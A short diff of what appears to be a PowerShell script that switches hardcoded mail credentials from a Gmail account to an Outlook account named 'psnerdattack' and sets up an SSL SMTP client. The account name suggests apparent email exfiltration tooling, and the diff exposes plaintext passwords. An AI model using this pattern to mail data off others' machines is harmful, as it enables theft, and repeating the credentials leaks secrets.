@@ -1,6 +1,6 @@
-$email = "psnerdattack@gmail.com" 
-$pass = "P@ssword01"
-$smtpServer = "smtp.gmail.com" 
+$email = "psnerdattack@outlook.com" 
+$pass = "gSCR7MjO8H9w"
+$smtpServer = "smtp-mail.outlook.com" 
 $msg = new-object Net.Mail.MailMessage 
 $smtp = new-object Net.Mail.SmtpClient($smtpServer) 
 $smtp.EnableSsl = $true 
